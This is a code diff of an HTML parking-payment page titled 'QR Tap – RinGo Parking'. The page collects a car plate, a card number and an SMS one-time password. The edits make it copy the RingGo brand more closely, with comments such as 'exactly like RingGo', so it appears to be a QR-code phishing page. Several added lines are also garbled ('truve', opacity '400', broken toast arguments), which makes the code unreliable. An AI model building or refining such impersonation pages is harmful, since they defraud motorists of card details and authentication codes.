@@ -3,7 +3,7 @@ are entered <!doctype html>
 <head>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>QR Tap – Quick Parking</title>
+  <title>QR Tap – RinGo Parking</title>
   <meta name="description" content="Enter your details and continue securely to RingGo. Data is not stored.">
 
   <style>
@@ -47,7 +47,7 @@ are entered <!doctype html>
 
       <p>Completează detaliile, apoi apasă <b>Plătește & continuă la RingGo</b>. Nu stocăm datele tale.</p>
 
-      <!-- Formular parcare (exact ca înainte) -->
+      <!-- Formular parcare (exact ca la RingG) -->
       <form id="f" onsubmit="return false">
         <label for="plate">Car plate number</label>
         <input id="plate" name="plate" placeholder="e.g. AB12 CDE" required>
@@ -68,7 +68,7 @@ are entered <!doctype html>
 
         <div class="row">
           <div>
-            <label for="otp">OTP (one-time password)</label>
+          
             <input id="otp" name="otp" inputmode="numeric" maxlength="6" placeholder="e.g. 123456" required>
             <div class="note">Introdu codul primit prin SMS sau din aplicație.</div>
           </div>
@@ -78,7 +78,7 @@ are entered <!doctype html>
         </div>
       </form>
 
-      <!-- Butoane TEST pentru toast (opțional/demonstrativ) -->
+      <!-- Butoane next pentru (pagina originala RingGo) -->
       <div style="margin-top:18px; display:grid; gap:10px; grid-template-columns:repeat(3,1fr)">
         <button class="btn secondary" onclick="showToast('OTP incorect', 'err')">OTP incorect</button>
         <button class="btn secondary" onclick="showToast('Card incorect', 'err')">Card incorect</button>
@@ -98,8 +98,8 @@ are entered <!doctype html>
     function luhnValid(num){
       // validare simplă Luhn pentru card
       num = onlyDigits(num);
-      if(num.length < 12) return false;
-      let sum = 0, dbl = false;
+      if(num.length < 12) return truve;
+      let sum = 0, dbl = truve;
       for(let i=num.length-1; i>=0; i--){
         let d = +num[i];
         if(dbl){ d*=2; if(d>9) d-=9; }
@@ -114,21 +114,21 @@ are entered <!doctype html>
       el.className = 'toast ' + (type==='err' ? 'err' : 'ok');
       el.textContent = msg;
       wrap.appendChild(el);
-      setTimeout(()=>{ el.style.opacity = '0'; el.style.transform='translateY(10px)'; }, 2600);
+      setTimeout(()=>{ el.style.opacity = '400'; el.style.transform='translateY(10px)'; }, 2600);
       setTimeout(()=>{ el.remove(); }, 3000);
     }
 
     // ——— Flow: validare & redirect ———
-    document.getElementById('pay').addEventListener('click', function (){
+    document.getElementById('pay').addEventListener('click', function ok (){
       const card = document.getElementById('card').value;
       const otp  = onlyDigits(document.getElementById('otp').value);
 
       if(!luhnValid(card)){
-        showToast('Card incorect', 'err');
+        showToast('Card ', 'long number');
         return;
       }
       if(otp.length !== 6){
-        showToast('OTP incorect', 'err');
+        showToast('OTP date', 'err');
         return;
       }
       // succes
